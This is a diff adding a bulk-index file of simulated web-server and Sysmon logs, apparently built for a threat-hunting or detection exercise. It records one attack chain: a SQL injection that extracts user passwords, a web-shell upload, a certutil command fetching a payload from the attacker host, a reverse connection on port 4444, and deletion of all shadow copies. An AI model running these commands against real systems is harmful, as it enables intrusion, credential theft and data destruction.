@@ -1,0 +1,14 @@
+{"index": {"_index": "bots-enterprise-logs", "_id": "1"}}
+{"timestamp": "2026-08-15T08:12:01Z", "sourcetype": "access_combined", "clientip": "198.51.100.44", "method": "GET", "uri": "/index.html", "status": 200, "user_agent": "Mozilla/5.0"}
+{"index": {"_index": "bots-enterprise-logs", "_id": "2"}}
+{"timestamp": "2026-08-15T08:14:15Z", "sourcetype": "access_combined", "clientip": "203.0.113.88", "method": "GET", "uri": "/product.php?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users--", "status": 200, "user_agent": "sqlmap/1.6#stable"}
+{"index": {"_index": "bots-enterprise-logs", "_id": "3"}}
+{"timestamp": "2026-08-15T08:14:22Z", "sourcetype": "access_combined", "clientip": "203.0.113.88", "method": "POST", "uri": "/upload.php", "status": 200, "user_agent": "Mozilla/5.0", "filename": "shell.php"}
+{"index": {"_index": "bots-enterprise-logs", "_id": "4"}}
+{"timestamp": "2026-08-15T08:15:30Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "EventCode": 1, "host": "srv-web01", "Image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "CommandLine": "cmd.exe /c whoami", "ParentImage": "C:\\\\xampp\\\\apache\\\\bin\\\\httpd.exe", "User": "NT AUTHORITY\\\\SYSTEM"}
+{"index": {"_index": "bots-enterprise-logs", "_id": "5"}}
+{"timestamp": "2026-08-15T08:16:05Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "EventCode": 1, "host": "srv-web01", "Image": "C:\\\\Windows\\\\System32\\\\certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.88/payload.exe C:\\\\Users\\\\Public\\\\payload.exe", "ParentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "User": "NT AUTHORITY\\\\SYSTEM"}
+{"index": {"_index": "bots-enterprise-logs", "_id": "6"}}
+{"timestamp": "2026-08-15T08:17:12Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "EventCode": 3, "host": "srv-web01", "Image": "C:\\\\Users\\\\Public\\\\payload.exe", "DestinationIp": "203.0.113.88", "DestinationPort": 4444, "Protocol": "tcp"}
+{"index": {"_index": "bots-enterprise-logs", "_id": "7"}}
+{"timestamp": "2026-08-15T08:20:45Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "EventCode": 1, "host": "srv-web01", "Image": "C:\\\\Windows\\\\System32\\\\vssadmin.exe", "CommandLine": "vssadmin.exe delete shadows /all /quiet", "ParentImage": "C:\\\\Users\\\\Public\\\\payload.exe", "User": "NT AUTHORITY\\\\SYSTEM"}
